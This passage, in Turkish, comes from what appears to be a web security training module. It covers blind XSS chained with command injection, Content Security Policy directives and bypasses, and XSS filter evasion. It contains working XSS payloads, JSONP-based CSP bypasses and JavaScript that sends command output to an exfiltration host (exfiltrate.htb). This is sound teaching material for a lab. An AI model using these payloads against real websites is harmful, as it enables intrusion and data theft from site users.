Gördüğümüz gibi, durum curl kullanılarak elde ediliyor gibi görünüyor. Eğer bu yanlış uygulanmışsa ya da uygun bir sanitizasyon yoksa, potansiyel bir komut enjeksiyonu açığı vardır. Bunu, exfiltrasyon sunucusuna ek bir curl komutu enjekte ederek doğrulayabiliriz:

```js
var xhr = new XMLHttpRequest();
var params = `webapp_selector=${encodeURIComponent("| curl http://exfiltrate.htb?pwn")}`;
xhr.open('POST', 'http://internal.vulnerablesite.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Daha sonra, sızıntı sunucusunda beklenen isteği görebiliriz, böylece komut enjeksiyonu güvenlik açığını doğrulayabiliriz:

![Pasted image 20241217140917.png](/img/user/resimler/Pasted%20image%2020241217140917.png)

## Exploiting the Vulnerability

Komut enjeksiyon payloadını XSS payload'umuzda belirtebilir ve sonucu exfiltration sunucusuna exfiltrate edebiliriz. Bu nedenle, exploitation diğer komut enjeksiyonu güvenlik açıklarından farklı değildir. Örneğin, `id` komutunu çalıştırabiliriz

```js
ar xhr = new XMLHttpRequest();
var params = `webapp_selector=${encodeURIComponent("| id")}`;
xhr.open('POST', 'http://internal.vulnerablesite.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Sonuç base64 kodlu yanıtta yer alır:

```bash
uid=0(root) gid=0(root) groups=0(root)
```

# Content Security Policy (CSP)

[Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP), istismar edilebilirliklerini sınırlandırarak Cross-Site Scripting (XSS) güvenlik açıklarının şiddetini azaltmak için kullanılabilecek derinlemesine bir güvenlik önlemidir. `Content-Security-Policy` response header'ında yapılandırılır.


## CSP Basics

Bir **CSP** (Content Security Policy), birden fazla yönergeden (directive) oluşur. Her direktif bir veya daha fazla değer kabul eder. Tarayıcı, CSP'yi uygular ve CSP'ye bağlı olarak kaynakların yüklenmesini veya çalıştırılmasını engeller. Bu bölümde birkaç örnek direktifi ele alacağız.

Örneğin, **`script-src`** direktifi, JavaScript'in nereden yüklenip çalıştırılabileceğini tanımlar; aşağıdaki policy ile JavaScript kodunun yalnızca belirli domainden yüklenmesine izin verebiliriz:

```http
Content-Security-Policy: script-src 'self' http://benignsite.htb
```

Bu, tarayıcıya, JavaScript'i yalnızca sayfanın kendisiyle aynı originden (**same-origin**) ve external origin olarak `http://benignsite.htb` adresinden yüklemesi gerektiğini söyler. Bu nedenle, bir saldırgan bir **XSS payload**'ında aşağıdaki JavaScript kodunu enjekte ederse, kurbanın tarayıcısı bu script'i yüklemez ve dolayısıyla çalıştırmaz:

```html
<script src=""http://exploitserver.htb/pwn.js"></script>
```

Ancak, aşağıdaki script dosyalarının yüklenmesine ve yürütülmesine izin verilir:

```html
<script src=""/js/useful.js"></script>
<script src=""http://benignsite.htb/main.js"></script>
```

Ayrıca, `unsafe-inline` değeri belirtilmediğinden, tüm inline script dosyalarını engeller. Bu nedenle, aşağıdaki potansiyel XSS payload'larının tümü engellenir ve dolayısıyla çalıştırılmaz:

```html
<script>alert(1)</script>
<img src=x onerror=alert(1) />
<a href="javascript:alert(1)">click</a>
```

Ayrıca, başka yaygın direktifler de vardır:

- **`style-src`**: Stil dosyaları (**stylesheets**) için izin verilen originler
- **`img-src`**: Görseller için izin verilen originler
- **`object-src`**: `<object>` veya `<embed>` gibi object'ler için izin verilen originler
- **`connect-src`**: Script'lerden yapılan HTTP istekleri için izin verilen originler. Örneğin, **`XMLHttpRequest`** kullanımı
- **`default-src`**: Belirli bir direktif açıkça belirtilmediğinde kullanılan varsayılan değer. Örneğin, eğer **`img-src`** CSP'de belirtilmemişse, tarayıcı görseller için bu değeri kullanır
- **`frame-ancestors`**: Sayfanın bir `<iframe>` içinde çerçevelenmesine izin verilen originler. Bu, **`Clickjacking`** saldırılarını önlemek için kullanılabilir
- **`form-action`**: Form gönderimleri için izin verilen originler

Ek CSP yönergeleri için [burada](https://content-security-policy.com/) verilen listeye göz atın.

Direktifler için ek değerler şunları içerir:

- **`*`**: Tüm originlere izin verilir
- **`'none'`**: Hiçbir origine izin verilmez
- **`*.benignsite.htb`**: **`benignsite.htb`** domain'in tüm subdomainlerine izin verilir
- **`unsafe-inline`**: Satır içi (inline) elementlere izin verilir
- **`unsafe-eval`**: JavaScript'in **`eval`** fonksiyonu gibi dinamik kod değerlendirmelerine izin verilir
- **`sha256-407e1bf4a1472948aa7b15cafa752fcf8e90710833da8a59dd8ef8e7fe56f22d`**: Bir element'e hash ile izin verilir
- **`nonce-S0meR4nd0mN0nC3`**: Bir element'e nonce ile izin verilir

Ek CSP direktifleri değerleri için burada verilen [listeye](https://content-security-policy.com/#source_list) göz atın.

## Secure CSPs

CSP'yi mümkün olduğunca katı hale getirmek bir web uygulamasının güvenliğini sağlamak için çok önemlidir. Bu, katı bir temel CSP'den başlayarak ve web uygulaması amaçlandığı gibi çalışana kadar kısıtlamaları kademeli olarak gevşeterek başarılabilir. İyi bir temel CSP aşağıdaki gibidir:

```http
Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; frame-ancestors 'self'; form-action 'self';
```

Bu CSP yalnızca aynı orginden görüntülerin, stil sayfalarının ve script dosyalarının yüklenmesine izin verir, yalnızca JavaScript ve form gönderimlerinden aynı orgine HTTP isteklerine izin verir, yalnızca aynı orginin web sayfasını frame etmesine izin verir ve başka herhangi bir originin yüklenmesini engeller. Herhangi bir external origin kullanılıyorsa CSP'nin buna göre ayarlanması gerekir.

Ek olarak, web uygulamasının kullandığı inline JavaScript kodu, engellenmesini önlemek için kaldırılmalıdır. Bu, bir script dosyasına taşınarak ve yüklenerek kolayca gerçekleştirilebilir. Örneğin, aşağıdaki inlene JavaScript kodunu düşünün:

```html
<script>
var poc = "test";
function submitForm(){
	console.log(poc);
}
</script>

<button id="submit" onclick="submitForm()">
```

Bu, aşağıdaki içeriğe sahip bir `test.js` dosyası oluşturmakla fonksiyonel olarak aynıdır:

```js
var poc = "test";
function submitForm(){
	console.log(poc);
}

document.getElementById("submit").addEventListener('click', submitForm);
```

Ve ardından script dosyasını yükleyin:

```html
<script src=""/test.js"></script>
```

Bu şekilde, tüm inline JavaScript kodu kaldırılabilir.

Bizim için bir CSP'yi değerlendirmek üzere Google tarafından sağlanan [CSP Değerlendiricisi](https://csp-evaluator.withgoogle.com/) gibi mevcut çevrimiçi araçları kullanabiliriz. Güvenli bir CSP'nin nasıl yazılacağı hakkında daha fazla bilgi için [OWASP CSP Cheat Sheet'e](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html) göz atın.


# Bypassing Weak CSPs

CSP'ler, CSP direktifleri ve CSP direktif değerlerinden bahsettiğimize göre, şimdi weak CSP'lerden faydalanma ve bunları atlatma konusuna geçelim.

## Bypassing Weak CSPs

CSP'ler, XSS güvenlik açıklarını önlemek için derinlemesine bir savunma önlemi eklemek için kullanılabilir. Ancak, bir web uygulamasının CSP uygulaması otomatik olarak tüm XSS saldırılarına karşı korunduğu anlamına gelmez. CSP zayıfsa, onu atlamak mümkün olabilir. Bu nedenle, bir web uygulamasının CSP'sini potansiyel bypass'lara karşı analiz etmek çok önemlidir.

Aşağıdaki CSP'ye bakarak başlayalım:

```http
Content-Security-policy: default-src 'none'; img-src 'self'; style-src *; font-src *; script-src 'self' https://*.google.com;
```

Bu CSP, görüntülerin origin'in kendisinden, stillerin ve yazı tiplerinin herhangi bir yerden, scriptlerin origin'in kendisinden ve `google.com`'un herhangi bir subdomain'inden yüklenmesine izin verir. Diğer tüm originler `default-src ‘none’` direktifi nedeniyle yüklenemez.

Bir kavram kanıtı olarak web uygulamasına basit bir `alert` açılır penceresi enjekte etmeyi denediğimizi varsayalım:

```html
<script>alert(1)</script>
```

CSP nedeniyle, alert pop-up gösterilmez; bunun yerine, tarayıcının JavaScript konsolu aşağıdaki hata mesajını yazdırır:

```html
Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'self' https://*.google.com". Either the 'unsafe-inline' keyword, a hash ('sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI='), or a nonce ('nonce-...') is required to enable inline execution
```

Bu savunma tekniği ilk bakışta güvenli görünse de, `JSONP` ile atlatılabilir. [JSONP](https://www.w3schools.com/js/js_json_jsonp.asp), Same-Origin politikası nedeniyle sorun yaşamadan farklı originler arasında veri alan bir tekniği ifade eder. JSONP'nin temel fikri, Same-Origin politikasından hariç tutuldukları için originler arasında veri almak için `script` tag'lerini kullanmaktır. Örneğin, bir web uygulamasının `http://vulnerablesite.htb` aşağıdaki JSON verilerini döndüren `http://someapi.htb/stats` endpoint'inden veri almak istediğini varsayalım:

```json
{'clicks': 1337}
```

API'de CORS yapılandırılmamışsa web uygulaması, Same-Origin policy nedeniyle cross origin isteğine verilen response'a erişemez. Ancak, script tagları Same-Origin politikasının dışında tutulduğundan, web uygulaması sayfasında aşağıdaki HTML tag'ini kullanarak verileri yükleyebilir:

```html
<script src=""http://someapi.htb/stats"></script>
```

Şimdi, web uygulamasının verileri bir şekilde işlemesi gerektiğinden, bu tek başına pratik değildir. Web uygulamasının bu amaçla `processData` adında bir fonksiyon kullandığını varsayalım. Ancak bu haliyle, alınan veriyi bu fonksiyona aktarmanın bir yolu yoktur. İşte burada `JSONP` devreye giriyor. API JSONP'yi destekliyorsa, veriyi gönderen endpoint üzerinde bir GET parametresi okuyacak ve response'u buna göre ayarlayacaktır. Bu parametre genellikle callback olarak adlandırılır. `http://someapi.htb/stats?callback=processData` endpoint'ini çağırdığımızı varsayalım. Bu, API'nin aşağıdaki response'u göndermesiyle sonuçlanır:

```js
processData({'clicks': 1337})
```

Web uygulaması artık sayfasına aşağıdaki kod tag'ini ekleyebilir:

```html
<script src=""http://someapi.htb/stats?callback=processData"></script>
```

Bu, web uygulamasının `processData` fonksiyonunun, Same-Origin politikasını veya CORS ihtiyacını ihlal etmeden API'den cross-origin olarak getirilen veriler üzerinde çağrılmasıyla sonuçlanır.

JSONP endpoint'leri, arayanın çağrılacak bir fonksiyon belirtmesine izin verdiğinden, JSONP endpoint'ini sunan domain tarafından gönderilen JavaScript kodunu dinamik olarak oluşturmak için kullanılabilirler. Bu nedenle JSONP, CSP'leri atlamak için kullanılabilir. Google birden fazla farklı JSONP endpoint sunmaktadır. [JSONBee](https://github.com/zigoo0/JSONBee) GitHub deposu, CSP'leri atlamak için kullanılabilecek birçok JSONP endpoint'ini listeler. Yukarıdaki CSP'yi atlamak için aşağıdaki Google JSONP endpoint'ini kullanabiliriz:

```html
<script src=""https://accounts.google.com/o/oauth2/revoke?callback=alert(1);"></script>
```

Bu girdiyi ziyaretçi defterine göndererek alert pop-up tetiklenir ve böylece CSP atlanır:

![Pasted image 20241217222939.png](/img/user/resimler/Pasted%20image%2020241217222939.png)

Bir diğer yaygın zayıflık ise '`self`' değerinin otomatik olarak güvenli olduğu varsayımıdır. Örneğin, aşağıdaki CSP'yi düşünün:

```http
Content-Security-policy: default-src 'none'; img-src 'self'; style-src *; script-src 'self';
```

Bu kez, script dosyaları yalnızca originin kendisinden yüklenebilir. Originin bir JSONP endpoint'i sunmadığını varsayarsak, bu güvenli görünüyor. Ancak, bir web uygulamasının kullanıcıların dosya yüklemesine izin verdiği bir senaryo düşünün. Rastgele dosya türlerine izin veriliyorsa, bir saldırgan bir `.js` dosyası yükleyebilir. Bu durumda, yüklenen payload'u orginin kendisinden yükleyerek bir XSS'den faydalanmak mümkündür:

```html
<script src=""/uploads/avatag.jpg.js"></script>
```

Genel olarak, bir CSP'nin değerlendirilmesi somut CSP'nin kendisine ve web uygulamasının fonksiyonelliğine bağlıdır. Gördüğümüz gibi, `script-src` yönergesini '`self`' olarak ayarlamak, web uygulaması bir dosya yükleme fonksiyonu uyguluyorsa güvensiz olabilir. Bu nedenle, CSP'yi uygulandığı somut web uygulaması contex'inde değerlendirmek çok önemlidir.

# XSS Filter Bypasses

Modülü sonlandırmak için, farklı XSS filtrelerini ve bunları nasıl atlatacağımızı tartışacağız.

## Achieving JavaScript Execution

XSS filtrelerini atlamayı tartışmadan önce, JavaScript kodu çalıştırmanın üç yolunu keşfedeceğiz.

#### Script Tag

Kod çalıştırmanın en yaygın (ve bariz) metodu `script` tagıdır; web tarayıcıları bu tagın içerdiği JavaScript kodunu çalıştıracaktır:

```html
<script>alert(1)</script>
```

#### Pseudo Protocols

JavaScript kodunun yürütülmesini sağlamak için verilerin nereden yüklendiğini gösteren belirli HTML attribute'lerinde `javascript` veya `data` gibi pseudo protokoller kullanabiliriz. Örneğin, bir `a` tag'inin hedefini `javascript` pseudo protokolüne ayarlayabiliriz ve linke tıklandığında ilgili JavaScript kodu çalıştırılır:

```html
<a href="javascript:alert(1)">click</a>
```

Kullanıcı etkileşimi gerektirmeyen pseudo protokollerle de XSS payload'ları oluşturabiliriz. Örneğin, `object` tag'ini kullanmak gibi. `Data` pseudo protokolü, düz HTML kodu veya base64 kodlu HTML kodu belirtmemize olanak tanır:

```html
<object data="javascript:alert(1)">
<object data="data:text/html,<script>alert(1)</script>">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

#### Event Handlers

Üçüncü olarak, `onload` veya `onerror` gibi event handler'ları kullanarak event handler tetiklendiğinde çalıştırılacak JavaScript kodunu belirleyebiliriz:

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

Bu amaçla kullanabileceğimiz birçok event handler vardır. İyi bir genel bakış PortSwigger'ın XSS Cheat Sheet'i tarafından sağlanmaktadır.

## Bypassing Basic Blacklists

Bir web uygulamasının JavaScript kodunun yürütülmesine yol açabilecek keyword'leri engellemek için basit bir blacklist uyguladığını varsayalım. Örneğin, `script` tag'i gibi HTML tag'lerini, `javascript` ve `data` gibi pseudo protokolleri ve `onload` ve `onerror` gibi event handler'ları engelleyerek.

Bu durumlarda, basit bir blacklist'i atlatmak için birkaç şey deneyebiliriz. Örneğin, HTML tag'lerinde, pseudo protokollerde ve event handler'larda büyük/küçük harf kullanımı önemsizdir. Daha spesifik olarak, yalnızca küçük harfli anahtar kelimeleri engelleyen blacklist'i atlatmak için küçük ve büyük harfleri karıştırabiliriz:

```html
<ScRiPt>alert(1);</ScRiPt>
<object data="JaVaScRiPt:alert(1)">
<img src=x OnErRoR=alert(1)>
```

Ayrıca, basit bir blacklist `<script>` keyword'ünün tüm oluşumlarını siler ancak recursive olarak uygulanmazsa, aşağıdakine benzer bir payload ile filtreyi atlatabiliriz:

```html
<scr<script>ipt>alert(1);</scr<script>ipt>
```

Son olarak, böyle bir blacklist zayıf bir regular expression kullanıyorsa ve HTML Tag'lerinin sözdizimi hakkında varsayımlarda bulunuyorsa veya yalnızca belirli özel karakterleri engelliyorsa, bu varsayımları kırarak blacklist'i atlatabiliriz. Örneğin, bir blacklist herhangi bir event handler'dan önce bir boşluk bekliyorsa veya bir input alanı boşluğa izin vermiyorsa, aşağıdaki payload filtreyi atlatabilir:

```html
<svg/onload=alert(1)>
<script/src="http://exploit.htb/exploit"></script>
```

## Advanced Bypasses

Bir HTML tag'i enjekte ederek JavaScript kodunun yürütülmesine neden olduğumuzu varsayalım. Bu durumda, JavaScript koduna uygulanan ve JavaScript context'inde hangi fonksiyonları çağırabileceğimizi veya hangi verilere erişebileceğimizi kısıtlayan ek filtreleri atlamamız gerekebilir. Bu tür filtreleri atlamaya çalışmak için uygulayabileceğimiz birçok teknik vardır. String'leri encoding ederek ve JavaScript kodunu çalıştırmak için bu string'leri `execution sink`'lere aktararak filtreleri nasıl atlayacağımızı keşfedeceğiz.

JavaScript'te, stringlere blacklist'lerden kaçmamıza yardımcı olacak birçok farklı kodlama uygulayabiliriz. İşte “`alert(1)”` stringinin farklı kodlamaları:

```js
# Unicode
"\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029"

# Octal Encoding
"\141\154\145\162\164\50\61\51"

# Hex Encoding
"\x61\x6c\x65\x72\x74\x28\x31\x29"

# Base64 Encoding
atob("YWxlcnQoMSk=")
```

Payload'umuzu bir string içinde sağlamak için tırnak işaretlerini kullanabilmemiz gerekir. Bir filtre tırnak işaretlerini kaldırır veya engellerse, payload'umuzu içeren bir string oluşturmak için aşağıdaki hilelerden birini kullanabiliriz:

```js
# String.fromCharCode
String.fromCharCode(97,108,101,114,116,40,49,41)

# .source
/alert(1)/.source

# URL Encoding
decodeURI(/alert(%22xss%22)/.source)
```

Şimdiye kadar, payload'umuzu yalnızca bir string olarak sağlamayı başardık; ancak, tarayıcı yalnızca bir string'i input olarak alan bir execution sink'e iletilirse onu çalıştıracaktır. Bu tür bir execution sink'in en ünlü örneği `eval` fonksiyonudur; `eval`'a ek olarak, diğer execution sink'ler şunları içerir:

```js
eval("alert(1)")
setTimeout("alert(1)")
setInterval("alert(1)")
Function("alert(1)")()
[].constructor.constructor(alert(1))()
```

Son olarak, zayıf bir XSS filtresini atlatmayı denemek için bir execution sink ile kodlanmış bir stringi birleştirebiliriz:

```js
eval("\141\154\145\162\164\50\61\51")
setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41))
Function(atob("YWxlcnQoMSk="))()
```

Not: Gerçek dünyada bir XSS filtresini atlamak için, SQL injection veya command injection gibi diğer güvenlik açıkları için filtreleri atlamakta kullanılan aynı metodolojiyi uygulayabiliriz. Gerçek bypass, web uygulaması tarafından uygulanan filtreye bağlıdır. Engellenmeyen bir exploit bulmak için hangi keywordlerin whitelist veya blacklist olduğunu belirlemek dikkatli bir test gerektirir

## Resources

Daha fazla XSS filtresi bypass'ı için OWASP'ın [XSS Filtresi Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)'ine göz atın. Ayrıca, farklı filtre türleri için XSS payload koleksiyonları bulunmaktadır. Örneğin, herhangi bir parantez kullanamıyorsak, [Parantezsiz XSS payload](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md) koleksiyonuna başvurabiliriz. Ek olarak, [HTML 5 Security Cheatsheet](https://html5sec.org/), XSS exploit için tarayıcıya özel başka örnekler de vermektedir.

## Lab Information

Not: Admin kullanıcısının sayfaya erişim şekli nedeniyle, lütfen payload'unuzdaki URL'lerde herhangi bir port kullanmadığınızdan emin olun, yani `http://exfiltrate.htb:PORT/` yerine `http://exfiltrate.htb/` kullanın.